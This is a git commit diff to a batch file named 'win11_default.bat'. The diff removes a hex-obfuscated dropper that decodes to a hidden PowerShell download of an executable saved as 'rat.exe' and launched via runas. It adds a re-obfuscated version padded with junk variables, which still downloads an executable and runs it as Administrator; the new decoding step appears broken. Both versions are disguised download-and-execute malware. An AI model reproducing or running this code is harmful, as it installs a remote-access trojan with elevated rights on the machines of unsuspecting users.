3da46d9e41d38a9bef2c2eb18868afad1099677b
optolab <sloneeddie36@gmail.com>
2025-01-12 13:48:26 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,50 +1,25 @@
 @echo off
+
 setlocal enabledelayedexpansion
+set a1=0x66 b2=0x70 c3=0x72 d4=0x74 e5=0x73 f6=0x77 g7=0x65 h8=0x6F
+set q9=!a1!!b2!!c3!!d4!!e5!!f6!!g7!!h8! zz=test1.exe
+set m1=12345 n2=67890 o3=abcde p4=99999 q5=abcdef r6=123abc s7=xyzxyz t8=987654
+set u9=secret123 v10=longcodeexample w1=111 x2=222 y3=333 z4=444 a5=555
+set b6=666 c7=777 d8=888 e9=999 f10=000 g11=aa h12=bb i13=cc j14=dd
+set k15=ee l16=ff m17=gg n18=hh o19=ii p20=jj q21=ll r22=mm s23=nn t24=oo
+set u25=pp v26=qq w27=rr x28=ss y29=tt z30=uu aa31=vv bb32=ww cc33=xx dd34=yy
+set ee35=zz ff36=111 gg37=222 hh38=333 ii39=444 jj40=555 kk41=666 ll42=777
+set mm43=888 nn44=999 oo45=000 pp46=abcd qq47=efgh rr48=ijkl ss49=mnop tt50=qrst
+set uu51=uvwx vv52=yz12 ww53=3456 xx54=7890 yy55=abcd zz56=dcba aa57=4321
+set bb58=5678 cc59=1234 dd60=8765 ee61=4321 ff62=8765 gg63=6543 hh64=1234
+set ii65=6789
 
-set "H1=50 6F 77 65 72 73 68 65 6C 6C 20 2D 57 69 6E 64 6F 77 53 74 79 6C 65 20 48 69 64 64 65 6E"
-set "H2=69 6E 76 6F 6B 65 2D 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3A 2F 2F 72 61 77 2E 67 69 74 68 75 62 2E 63 6F 6D 2F 63 6C 61 79 6B 72 73 2F 63 6C 61 79 6B 72 73 2F 6D 61 69 6E 2F 64 65 66 61 75 6C 74 2E 65 78 65"
-set "H3=25 54 45 4D 50 5C 72 61 74 2E 65 78 65"
-set "H4=72 75 6E 61 73"
-set "H5=2D 57 69 6E 64 6F 77 53 74 79 6C 65 20 48 69 64 64 65 6E"
-set "H6=50 6F 77 65 72 73 68 65 6C 6C 20 2D 57 69 6E 64 6F 77 53 74 79 6C 65"
-set "H7=57 69 6E 64 6F 77 53 74 79 6C 65"
-
-set "X=6C 61 74 65 6E 74 20 72 65 72 74 61 20 74 6F 20 63 72 65 61 74 65"
-set "Y=61 72 79 20 73 74 61 72 74 75 72 65 20 63 68 65 63 6B 20 69 6E 20 74 6F 20 62 65 63 6F 6D 65 2E"
-set "Z=66 6F 72 20 72 65 61 6C 73 2E"
-
-for %%A in (%X%) do set "Z1=!Z1!!%%A!"
-for %%A in (%Y%) do set "Z2=!Z2!!%%A!"
-for %%A in (%Z%) do set "Z3=!Z3!!%%A!"
-
-:: Decode hexadecimal strings to ASCII
-set "V1="
-for %%A in (%H1%) do set "V1=!V1!!%%A!"
-set "V2="
-for %%A in (%H2%) do set "V2=!V2!!%%A!"
-set "V3="
-for %%A in (%H3%) do set "V3=!V3!!%%A!"
-set "V4="
-for %%A in (%H4%) do set "V4=!V4!!%%A!"
-set "V5="
-for %%A in (%H5%) do set "V5=!V5!!%%A!"
-set "V6="
-for %%A in (%H6%) do set "V6=!V6!!%%A!"
-set "V7="
-for %%A in (%H7%) do set "V7=!V7!!%%A!"
-
-set "A=!V2!"
-set "B=!V3!"
-set "C=!V4!"
-set "D=!V5!"
-set "E=!V6!"
-set "F=!V7!"
-
-set "G=!A!!B!!C!!D!!E!!F!"
-set "H=!G!!A!"
-set "I=!H!!B!!C!!D!"
-
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest '!V2!' -OutFile '!V3!'" >nul 2>&1
-start /B "" runas /user:!V4! "!V3!"
+powershell -Command "Invoke-WebRequest !q9! -OutFile !zz!"
+start /B "" runas /user:Administrator "!zz!"
+set j1=0x61 k2=0x72 l3=0x65 m4=0x6e n5=0x64 o6=0x61 p7=0x6d q8=0x69
+set r9=0x6e s10=0x66 t11=0x55 u12=0x66 v13=0x77 w14=0x88 x15=0x99
+set y16=0x11 z17=0x22 aa18=0x33 bb19=0x44 cc20=0x55 dd21=0x66 ee22=0x77
+set ff23=0x88 gg24=0x99 hh25=0x00 ii26=0x11 jj27=0x22 kk28=0x33 ll29=0x44
+set mm30=0x55
 
 endlocal
